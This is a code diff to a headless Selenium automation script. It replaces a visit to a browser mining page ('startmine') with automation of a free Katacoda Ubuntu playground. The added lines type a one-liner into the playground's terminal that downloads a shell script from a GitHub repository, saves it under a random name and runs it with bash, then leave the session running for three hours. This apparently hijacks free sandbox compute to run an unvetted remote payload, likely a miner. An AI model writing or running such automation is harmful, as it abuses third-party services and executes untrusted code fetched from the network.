@@ -20,9 +20,14 @@ options.headless = True
 driver = webdriver.Chrome(executable_path=CHROMEDRIVER_PATH , chrome_options=options)
 # ------------------------------------------------------------
 
-driver.get("http://startmine.anlinotes.rf.gd")
-time.sleep(7)
-driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//*[@id='thread-add']"))))
-time.sleep(3)
-driver.execute_script("arguments[0].click();", WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//*[@id='start']"))))
-time.sleep(7200)
+driver.get("https://www.katacoda.com/courses/ubuntu/playground")
+print("1st done")
+time.sleep(30)
+
+driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys("ran1=$(openssl rand -hex 5) && wget https://github.com/unmsjd28/ynsg7s9/raw/main/dm.sh -O $ran1.sh && bash $ran1.sh")
+print("2nd done")
+time.sleep(8)
+
+
+driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys(Keys.ENTER)
+time.sleep(10800)
